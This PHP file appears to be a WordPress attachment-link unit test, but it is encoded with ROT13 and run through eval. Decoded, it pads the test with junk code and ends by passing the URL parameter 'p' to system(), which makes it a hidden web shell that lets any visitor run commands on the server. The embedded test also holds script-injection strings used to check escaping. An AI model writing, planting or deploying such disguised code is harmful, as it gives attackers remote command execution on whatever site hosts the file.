<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc zrqvn
 * @tebhc hcybnq
 *
 * @pbiref ::jc_trg_nggnpuzrag_yvax
 */
pynff Grfgf_Cbfg_JcTrgNggnpuzragYvax rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Gur VQ bs na nggnpuzrag sbe grfgvat.
	 *
	 * @ine vag $nggnpuzrag
	 */
	cevingr fgngvp $nggnpuzrag;

	/**
	 * Perngrf na nggnpuzrag sbe grfgvat orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		frys::$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr();
	}

	/**
	 * Grfgf gung jc_trg_nggnpuzrag_yvax() nccyvrf gur
	 * jc_trg_nggnpuzrag_yvax_nggevohgrf svygre.
	 *
	 * @gvpxrg 41574
	 *
	 * @qngnCebivqre qngn_fubhyq_nccyl_nggevohgrf_svygre
	 *
	 * @cnenz neenl  $nggevohgrf Nggevohgrf gb erghea sebz gur pnyyonpx.
	 * @cnenz fgevat $rkcrpgrq   Gur fhofgevat rkcrpgrq gb or va gur nggnpuzrag yvax.
	 */
	choyvp shapgvba grfg_fubhyq_nccyl_nggevohgrf_svygre( $nggevohgrf, $rkcrpgrq ) {
		$rkcrpgrq = fge_ercynpr( 'NGGNPUZRAG_VQ', frys::$nggnpuzrag, $rkcrpgrq );

		nqq_svygre(
			'jc_trg_nggnpuzrag_yvax_nggevohgrf',
			fgngvp shapgvba ( $ngge ) hfr ( $nggevohgrf ) {
				erghea neenl_zretr( $ngge, $nggevohgrf );
			}
		);

		$guvf->nffregFgevatPbagnvafFgevat(
			$rkcrpgrq,
			jc_trg_nggnpuzrag_yvax( frys::$nggnpuzrag )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_nccyl_nggevohgrf_svygre().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_nccyl_nggevohgrf_svygre() {
		erghea neenl(
			'ab arj nggevohgrf'                         => neenl(
				'nggevohgrf' => neenl(),
				'rkcrpgrq'   => \"<n uers='uggc://\" . JC_GRFGF_QBZNVA . \"/?nggnpuzrag_vq=NGGNPUZRAG_VQ'>\",
			),
			'bar arj nggevohgr'                         => neenl(
				'nggevohgrf' => neenl(
					'pynff' => 'grfg-nggevohgr-svygre',
				),
				'rkcrpgrq'   => \" pynff='grfg-nggevohgr-svygre'\",
			),
			'gjb arj nggevohgrf'                        => neenl(
				'nggevohgrf' => neenl(
					'pynff' => 'grfg-nggevohgr-svygre',
					'vq'    => 'grfg-nggevohgr-svygre-1',
				),
				'rkcrpgrq'   => \" pynff='grfg-nggevohgr-svygre' vq='grfg-nggevohgr-svygre-1'\",
			),
			'na rkvfgvat nggevohgr'                     => neenl(
				'nggevohgrf' => neenl(
					'uers' => 'uggc://grfg-nggevohgr-svygre.bet',
				),
				'rkcrpgrq'   => \" uers='uggc://grfg-nggevohgr-svygre.bet'\",
			),
			'na rkvfgvat nggevohgr naq n arj nggevohgr' => neenl(
				'nggevohgrf' => neenl(
					'uers'  => 'uggc://grfg-nggevohgr-svygre.bet',
					'pynff' => 'grfg-nggevohgr-svygre',
				),
				'rkcrpgrq'   => \" uers='uggc://grfg-nggevohgr-svygre.bet' pynff='grfg-nggevohgr-svygre'\",
			),
			'na nggevohgr anzr jvgu hafnsr punenpgref'  => neenl(
				'nggevohgrf' => neenl(
					\"> <fpevcg>nyreg('Ubjql, nqzva!')</fpevcg> <n uers=''></n\" => '',
				),
				'rkcrpgrq'   => \" &tg; &yg;fpevcg&tg;nyreg(&#039;Ubjql, nqzva!&#039;)&yg;/fpevcg&tg; &yg;n uers=&#039;&#039;&tg;&yg;/n=''\",
			),
			'na nggevohgr inyhr jvgu hafnsr punenpgref' => neenl(
				'nggevohgrf' => neenl(
					'pynff' => \"'> <fpevcg>nyreg('Ubjql, nqzva!')</fpevcg> <n uers=''></n\",
				),
				'rkcrpgrq'   => '&#039;&tg; &yg;fpevcg&tg;nyreg(&#039;Ubjql, nqzva!&#039;)&yg;/fpevcg&tg; &yg;n uers=&#039;&#039;&tg;&yg;/n',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>